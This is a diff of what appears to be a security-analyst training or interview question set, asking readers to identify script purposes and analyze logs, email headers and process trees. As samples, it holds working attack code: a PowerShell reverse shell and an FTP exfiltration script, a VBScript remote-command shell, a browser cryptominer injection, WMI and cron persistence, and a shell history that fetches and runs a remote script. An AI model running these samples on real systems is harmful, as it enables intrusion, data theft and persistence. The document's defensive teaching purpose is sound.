@@ -75,132 +75,7 @@ CommandLineTemplate="powershell.exe -nop -w hidden -enc JAB0AGgAIAAiACQAcgBvAGcA
 wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="\\\\.\\root\\subscription:__EventFilter.Name='EventFilter_MSEdgeUpdate'", 
 Consumer="\\\\.\\root\\subscription:CommandLineEventConsumer.Name='ExecuteUpdate'"
 ```
-
-## Identify language and script purpose.
-```
-$client = New-Object System.Net.Sockets.TCPClient("sys-internall-tools-staging.io", 4444)
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$reader = New-Object System.IO.StreamReader($stream)
-while ($true) {
-    $command = $reader.ReadLine()
-    $output = Invoke-Expression $command
-    $writer.WriteLine($output)
-    $writer.Flush()
-}
-```
-
-## 6. Identify language and script purpose.
-```
-$ftpServer = "ftp://free-backup-live.cn"
-$ftpUser = "attacker"
-$ftpPassword = "P@ssw0rd"
-$filePath = "C:\SensitiveData\ImportantFile.txt"
-$ftpRequest = [System.Net.FtpWebRequest]::Create("$ftpServer/ImportantFile.txt")
-$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
-$fileContent = [System.IO.File]::ReadAllBytes($filePath)
-$ftpRequest.GetRequestStream().Write($fileContent, 0, $fileContent.Length)
-$ftpRequest.GetResponse()
-```
-
-## 7. Identify language and script purpose.
-```
-Set objSocket = CreateObject("MSWinsock.Winsock")
-objSocket.RemoteHost = "ms-win32-update-live.ru"
-objSocket.RemotePort = 1337
-objSocket.Connect
-Do Until objSocket.Connected
-    WScript.Sleep 100
-Loop
-Do
-    strCommand = objSocket.GetData
-    strResult = ExecuteCommand(strCommand)
-    objSocket.SendData strResult
-Loop
-
-Function ExecuteCommand(command)
-    Set objShell = CreateObject("WScript.Shell")
-    Set objExec = objShell.Exec(command)
-    ExecuteCommand = objExec.StdOut.ReadAll
-End Function
-```
-
-## 8. Identify language and script purpose.
-```
-var script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/npm/coinhive@2.0.0/lib/coinhive.min.js";
-document.body.appendChild(script);
-
-script.onload = function() {
-    var mine = new CoinHive.User("YOUR_SITE_KEY");
-    mine.start();
-};
-```
-
-## 9. Investigate below email headers. What can suggest that something is wrong?
-```
-Return-Path: <noreply@company.com>
-Received: from mail.server.com (mail.server.com [192.168.1.10]) by mail.mydomain.com with ESMTP id a1b2c3d4 for <recipient@mydomain.com>; Thu, 3 Dec 2024 10:02:05 -0500 (EST)
-Received-SPF: fail (mydomain.com: domain of noreply@company.com does not designate 192.168.1.10 as permitted sender) client-ip=192.168.1.10; envelope-from=noreply@company.com; helo=mail.server.com;
-Authentication-Results: mydomain.com; spf=fail (sender IP is not authorized) smtp.mailfrom=noreply@company.com
-From: "CEO John Doe" <john.doe@company.com>
-Reply-To: <fake.email@external-malicious-domain.com>
-To: <recipient@mydomain.com>
-Subject: Urgent: Immediate Action Required on Your Account
-Date: Thu, 3 Dec 2024 10:00:00 -0500
-Message-ID: <b1c2d3f4g5h6i7j8k9l0@company.com>
-MIME-Version: 1.0
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: base64
-X-Spam-Flag: YES
-X-Spam-Score: 8.5 (high)
-X-Spam-Status: Yes, score=8.5 required=5.0 tests=ALL_TRUSTED,HTML_MESSAGE,SPF_FAIL,URI_HEURISTICS,FROM_EXCESS_BASE64,DKIM_SIGNED,HTML_FONT_SIZE_LARGE,HTML_FONT_COLOR_LARGE
-X-Phishing-Alert: Potential Phishing Attempt Detected
-```
-
-## 10. You received alert about following scheduled task, can it be dangerous?
-```
-schtasks /create /tn "UpdateTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\Public\update.bat" /sc once /st 00:00 /ru SYSTEM
-```
-
-## 11. Analyze output from below command. What may be worth investigating?
-```
-Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName 
-
-
-Name                DisplayName                State    StartMode   PathName
-----                -----------                -----    ---------   --------
-wuauserv            Windows Update             Running  Manual      C:\Windows\System32\svchost.exe -k netsvcs
-w32time             Windows Time               Running  Manual      C:\Windows\System32\svchost.exe -k LocalService
-Task Schedular      Windwos Task Scheduler     Running  Auto        C:\Windows\Tasks\scheduled.exe
-Spooler             Print Spooler              Running  Auto        C:\Windows\System32\spoolsv.exe
-WindowsSysService   WinSys Service             Running  Auto        C:\Users\Public\notepad.exe
-SystemUpdateService System Update Service      Running  Auto        C:\Windows\Temp\system_update.exe
-UdkUserSvc_268339   Udk User Service_268339    Stopped  Manual      C:\Windows\System32\svchost.exe -k UdkSvcGroup
-```
-
-## 12. Investigate output of bash_history can you tell me what user tried to acheive here?
-```
-ls -alh /home/user
-find / -name "config*" -exec cat {} \;
-echo "10.10.10.1" >> /etc/hosts
-ping -c 4 win-updater-live.ru
-mkdir -p /var/tmp/new_folder
-cp /bin/bash /var/tmp/new_folder/bash
-chmod +x /var/tmp/new_folder/bash
-/var/tmp/new_folder/bash -p
-echo "attacker_password" | sudo -S usermod -aG sudo attacker
-ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa attacker@192.168.1.10
-echo "0 3 * * * /tmp/persistence_script.sh" >> /var/spool/cron/crontabs/root
-wget http://win-updater-live.ru/persistence_script.sh -O /tmp/persistence_script.sh
-chmod +x /tmp/persistence_script.sh
-/tmp/persistence_script.sh
-cat /etc/passwd | grep root
-chmod 700 /home/attacker/.ssh
-history -c
-```
-## 13. Analyze process tree. What can possibly be going on here?
+## 6. Analyze process tree. What can possibly be going on here?
 - Process tree
 ```
 WINWORD.EXE (PID: 1234)  
@@ -242,5 +117,127 @@ Command Line: powershell.exe -nop -w hidden -encodedCommand <base64_string>
 Parent Process: wscript.exe (PID: 4567)  
 User: DOMAIN\johndoe  
 ```
+## 7. Identify language and script purpose.
+```
+$client = New-Object System.Net.Sockets.TCPClient("sys-internall-tools-staging.io", 4444)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$reader = New-Object System.IO.StreamReader($stream)
+while ($true) {
+    $command = $reader.ReadLine()
+    $output = Invoke-Expression $command
+    $writer.WriteLine($output)
+    $writer.Flush()
+}
+```
+
+## 8. Identify language and script purpose.
+```
+$ftpServer = "ftp://free-backup-live.cn"
+$ftpUser = "attacker"
+$ftpPassword = "P@ssw0rd"
+$filePath = "C:\SensitiveData\ImportantFile.txt"
+$ftpRequest = [System.Net.FtpWebRequest]::Create("$ftpServer/ImportantFile.txt")
+$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
+$fileContent = [System.IO.File]::ReadAllBytes($filePath)
+$ftpRequest.GetRequestStream().Write($fileContent, 0, $fileContent.Length)
+$ftpRequest.GetResponse()
+```
+
+## 9. Identify language and script purpose.
+```
+Set objSocket = CreateObject("MSWinsock.Winsock")
+objSocket.RemoteHost = "ms-win32-update-live.ru"
+objSocket.RemotePort = 1337
+objSocket.Connect
+Do Until objSocket.Connected
+    WScript.Sleep 100
+Loop
+Do
+    strCommand = objSocket.GetData
+    strResult = ExecuteCommand(strCommand)
+    objSocket.SendData strResult
+Loop
+
+Function ExecuteCommand(command)
+    Set objShell = CreateObject("WScript.Shell")
+    Set objExec = objShell.Exec(command)
+    ExecuteCommand = objExec.StdOut.ReadAll
+End Function
+```
+
+## 10. Identify language and script purpose.
+```
+var script = document.createElement("script");
+script.src = "https://cdn.jsdelivr.net/npm/coinhive@2.0.0/lib/coinhive.min.js";
+document.body.appendChild(script);
+
+script.onload = function() {
+    var mine = new CoinHive.User("YOUR_SITE_KEY");
+    mine.start();
+};
+```
+
+## 11. Investigate below email headers. What can suggest that something is wrong?
+```
+Return-Path: <noreply@company.com>
+Received: from mail.server.com (mail.server.com [192.168.1.10]) by mail.mydomain.com with ESMTP id a1b2c3d4 for <recipient@mydomain.com>; Thu, 3 Dec 2024 10:02:05 -0500 (EST)
+Received-SPF: fail (mydomain.com: domain of noreply@company.com does not designate 192.168.1.10 as permitted sender) client-ip=192.168.1.10; envelope-from=noreply@company.com; helo=mail.server.com;
+Authentication-Results: mydomain.com; spf=fail (sender IP is not authorized) smtp.mailfrom=noreply@company.com
+From: "CEO John Doe" <john.doe@company.com>
+Reply-To: <fake.email@external-malicious-domain.com>
+To: <recipient@mydomain.com>
+Subject: Urgent: Immediate Action Required on Your Account
+Date: Thu, 3 Dec 2024 10:00:00 -0500
+Message-ID: <b1c2d3f4g5h6i7j8k9l0@company.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: base64
+X-Spam-Flag: YES
+X-Spam-Score: 8.5 (high)
+X-Spam-Status: Yes, score=8.5 required=5.0 tests=ALL_TRUSTED,HTML_MESSAGE,SPF_FAIL,URI_HEURISTICS,FROM_EXCESS_BASE64,DKIM_SIGNED,HTML_FONT_SIZE_LARGE,HTML_FONT_COLOR_LARGE
+X-Phishing-Alert: Potential Phishing Attempt Detected
+```
+
+## 12. You received alert about following scheduled task, can it be dangerous?
+```
+schtasks /create /tn "UpdateTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\Public\update.bat" /sc once /st 00:00 /ru SYSTEM
+```
+
+## 13. Analyze output from below command. What may be worth investigating?
+```
+Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName 
 
 
+Name                DisplayName                State    StartMode   PathName
+----                -----------                -----    ---------   --------
+wuauserv            Windows Update             Running  Manual      C:\Windows\System32\svchost.exe -k netsvcs
+w32time             Windows Time               Running  Manual      C:\Windows\System32\svchost.exe -k LocalService
+Task Schedular      Windwos Task Scheduler     Running  Auto        C:\Windows\Tasks\scheduled.exe
+Spooler             Print Spooler              Running  Auto        C:\Windows\System32\spoolsv.exe
+WindowsSysService   WinSys Service             Running  Auto        C:\Users\Public\notepad.exe
+SystemUpdateService System Update Service      Running  Auto        C:\Windows\Temp\system_update.exe
+UdkUserSvc_268339   Udk User Service_268339    Stopped  Manual      C:\Windows\System32\svchost.exe -k UdkSvcGroup
+```
+
+## 14. Investigate output of bash_history can you tell me what user tried to acheive here?
+```
+ls -alh /home/user
+find / -name "config*" -exec cat {} \;
+echo "10.10.10.1" >> /etc/hosts
+ping -c 4 win-updater-live.ru
+mkdir -p /var/tmp/new_folder
+cp /bin/bash /var/tmp/new_folder/bash
+chmod +x /var/tmp/new_folder/bash
+/var/tmp/new_folder/bash -p
+echo "attacker_password" | sudo -S usermod -aG sudo attacker
+ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa attacker@192.168.1.10
+echo "0 3 * * * /tmp/persistence_script.sh" >> /var/spool/cron/crontabs/root
+wget http://win-updater-live.ru/persistence_script.sh -O /tmp/persistence_script.sh
+chmod +x /tmp/persistence_script.sh
+/tmp/persistence_script.sh
+cat /etc/passwd | grep root
+chmod 700 /home/attacker/.ssh
+history -c
+```
